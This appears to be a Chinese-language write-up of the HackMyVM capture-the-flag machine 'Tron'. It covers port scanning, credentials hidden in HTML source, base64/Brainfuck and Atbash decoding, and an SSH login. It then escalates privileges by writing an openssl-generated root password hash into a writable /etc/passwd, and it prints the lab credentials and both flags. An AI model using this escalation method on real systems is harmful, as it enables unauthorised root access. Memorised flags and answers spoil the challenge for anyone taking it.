# Tron

2024-11-14 https://hackmyvm.eu/machines/machine.php?vm=Tron

## IP

192.168.5.40

## Scan

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

先看 80 web 服务，首页无内容，查看 html 源码发现: kzhh:SbWP9q94ZtE9qD 像是 ssh 登陆的用户凭据，尝试登陆，发现不是，可能是这个 wen 系统的登录用户凭据。

对 web 目录进行扫描，在 http://192.168.5.40/MCP/ 中发现了内容 http://192.168.5.40/MCP/tron.txt

```
MASTER CONTROL PROGRAM
----------------------

Ram:
Do you believe in the Users?

Crom:
Sure I do! If I didn't have a User, than who wrote me?


KysrKysrKysrK1s+Kz4rKys+KysrKysrKz4rKysrKysrKysrPDw8PC1dPj4+PisrKysrKysrKysrKy4tLS0tLi0tLS0tLS0tLS0tLisrKysrKysrKysrKysrKysrKysrKysrKy4tLS0tLS0tLS0tLS0tLS0tLS0tLS4rKysrKysrKysrKysrLg==
```

对最后的内容进行 base64 解码：

```
++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>>++++++++++++.----.-----------.++++++++++++++++++++++++.--------------------.+++++++++++++.
```

是 Brainfuck 编码，解码后内容为：

```
player
```

http://192.168.5.40/MCP/terminalserver/30513.txt 中发现了一个 rot 密码转换的提示，使用此转换方式解密 kzhh:SbWP9q94ZtE9qD

```
-------------------------
plaintext
abcdefghijklmnopqrstuvwxyz

ciphertext
zyxwvutsrqponmlkjihgfedcba
--------------------------
```

从 ciphertext 替换到 plaintext 只替换小写字母其他数字和大写字母不变：pass:SyWP9j94ZgE9jD

player:SyWP9j94ZgE9jD 登陆成功，得到 user flag：

```
player@tron:~$ cat user.txt
HMVMuserplayer2021
```

经过枚举，发现 /etc/passwd 文件可写，直接将 root 密码写入到其中:

```
openssl passwd -1 -salt new 456
$1$new$DEG4GSAwR8rsoc/FNKp0Q1

root:$1$new$DEG4GSAwR8rsoc/FNKp0Q1:0:0:root:/root:/bin/bash
```

root 的密码改成了 456 直接切换到 root 读取 root flag：

```
root@tron:~# ls
root.txt
root@tron:~# cat root.txt
HMVMMasterControlProgram2021
```
